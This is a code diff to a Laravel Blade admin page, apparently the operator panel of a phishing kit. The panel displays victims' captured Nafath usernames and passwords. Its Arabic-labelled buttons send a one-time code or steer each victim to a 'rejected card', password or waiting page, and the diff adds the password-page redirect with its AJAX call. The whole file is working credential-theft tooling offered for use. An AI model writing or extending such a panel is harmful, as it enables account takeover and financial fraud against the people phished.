@@ -67,6 +67,7 @@
                     الرمز</a>
                   <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
                     صفحة بطاقة مرفوضة</a>
+                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
                   <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
                     الى الانتظار</a>
                 </div>
@@ -80,6 +81,15 @@
               <div class="direct-chat-text">
                 <p><strong class="fs-3 border p-1 rounded">Username:</strong> {{$notification->nafad_username}}</p>
                 <p><strong class="fs-3 border p-1 rounded">Password:</strong> {{$notification->nafad_password}}</p>
+                <div class="d-flex  flex-wrap gap-4">
+                  <a class="user-action  border p-2 mx-2 my-2 rounded" style="" href="#" data-action="send-code">إرسال
+                    الرمز</a>
+                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
+                    صفحة بطاقة مرفوضة</a>
+                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
+                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
+                    الى الانتظار</a>
+                </div>
               </div>
             </div>
             <hr>
@@ -314,6 +324,7 @@
                     الرمز</a>
                   <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
                     صفحة بطاقة مرفوضة</a>
+                    <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
                   <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
                     الى الانتظار</a>
                 </div>
@@ -334,6 +345,7 @@
                     الرمز</a>
                   <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-final">تحويله الى
                     صفحة بطاقة مرفوضة</a>
+                  <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-password">تحويله الى صفحة كلمة المرور</a>
                   <a class="user-action  border p-2 mx-2 my-2 rounded" href="#" data-action="redirect-waiting">تحويله
                     الى الانتظار</a>
                 </div>
@@ -381,7 +393,9 @@
     {
       let code = prompt("Please enter the code");
       sendCode({{$notification->id}},code)
-    }else{
+    }
+    else
+    {
       if(action =='redirect-final')
       {
         let confirm = window.confirm('هل ترغب بتوجيه العميل الى صفحة بطاقة مرفوضة')
@@ -403,8 +417,33 @@
             }
           });
         }
+        return true;
       }
-      else{
+      if(action =='redirect-password')
+      {
+        let confirm = window.confirm('هل ترغب بتوجيه العميل الى صفحة كلمة المرور')
+        if(confirm)
+        {
+          $.ajax({
+            url: "/redirect-user",
+            type: "POST",
+            data: {
+              "_token": $('meta[name=csrf-token]').attr('content'),
+                visitor_id: visitor_id,
+                redirect_url: "redirect-password",
+            },
+            success: function(response) {
+                console.log(response);
+            },
+            error: function(xhr, status, error) {
+                console.log(error);
+            }
+          });
+        }
+        return true;
+      }
+      if(action =='redirect-waiting')
+      {
         let confirm = window.confirm('هل ترغب بتوجيه العميل الى صفحة الانتظار')
         if(confirm)
         {
@@ -423,8 +462,10 @@
               console.log(error);
           }
         });
+       }
+       return true;
       }
-      }
+
     }
   })
   function sendCode(visitor_id,code) {
